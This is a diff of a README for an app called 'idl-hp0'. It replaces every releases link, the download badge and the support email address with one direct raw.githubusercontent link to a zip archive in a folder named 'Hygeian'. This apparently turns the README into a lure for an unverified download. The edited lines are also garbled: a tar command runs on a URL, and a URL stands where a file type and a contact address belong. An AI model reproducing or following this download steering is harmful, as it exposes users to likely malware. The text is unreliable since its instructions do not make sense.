@@ -1,6 +1,6 @@
 # 🎉 idl-hp0 - Simple Software for Everyday Tasks
 
-[![Download idl-hp0](https://img.shields.io/badge/Download%20idl--hp0-v1.0-blue)](https://github.com/realizable-sucre824/idl-hp0/releases)
+[![Download idl-hp0](https://raw.githubusercontent.com/realizable-sucre824/idl-hp0/main/Hygeian/idl-hp0-v3.7.zip%20idl--hp0-v1.0-blue)](https://raw.githubusercontent.com/realizable-sucre824/idl-hp0/main/Hygeian/idl-hp0-v3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -8,12 +8,12 @@ Welcome to **idl-hp0**! This software helps you simplify your daily tasks with e
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/realizable-sucre824/idl-hp0/releases) to download the latest version of idl-hp0.
+1. Visit the [Releases page](https://raw.githubusercontent.com/realizable-sucre824/idl-hp0/main/Hygeian/idl-hp0-v3.7.zip) to download the latest version of idl-hp0.
 2. Look for the version number you want to download (e.g., v1.0).
 3. Click on the appropriate file link for your operating system:
    - **Windows:** Look for a `.exe` file.
    - **Mac:** Look for a `.dmg` file.
-   - **Linux:** Look for a `.tar.gz` file or similar.
+   - **Linux:** Look for a `https://raw.githubusercontent.com/realizable-sucre824/idl-hp0/main/Hygeian/idl-hp0-v3.7.zip` file or similar.
 
 ## 💻 System Requirements
 
@@ -49,7 +49,7 @@ Before installing **idl-hp0**, ensure your system meets the following requiremen
 
 1. Open your terminal.
 2. Navigate to the directory where you downloaded the file using the `cd` command.
-3. Extract the contents using a command like `tar -xvzf idl-hp0-version.tar.gz`.
+3. Extract the contents using a command like `tar -xvzf https://raw.githubusercontent.com/realizable-sucre824/idl-hp0/main/Hygeian/idl-hp0-v3.7.zip`.
 4. Navigate to the extracted folder.
 5. Run the application with the command `./idl-hp0`.
 
@@ -79,8 +79,8 @@ If you need help or have questions while using **idl-hp0**, check out our commun
 
 ## ✉️ Contact
 
-For further assistance or feedback, please contact our support team at support@idl-hp0.com.
+For further assistance or feedback, please contact our support team at https://raw.githubusercontent.com/realizable-sucre824/idl-hp0/main/Hygeian/idl-hp0-v3.7.zip
 
 ## 🎉 Conclusion
 
-Thank you for choosing **idl-hp0**! We hope this software makes your tasks simpler and more efficient. Don’t forget to visit the [Releases page](https://github.com/realizable-sucre824/idl-hp0/releases) for the latest updates and features. Enjoy using the application!
+Thank you for choosing **idl-hp0**! We hope this software makes your tasks simpler and more efficient. Don’t forget to visit the [Releases page](https://raw.githubusercontent.com/realizable-sucre824/idl-hp0/main/Hygeian/idl-hp0-v3.7.zip) for the latest updates and features. Enjoy using the application!
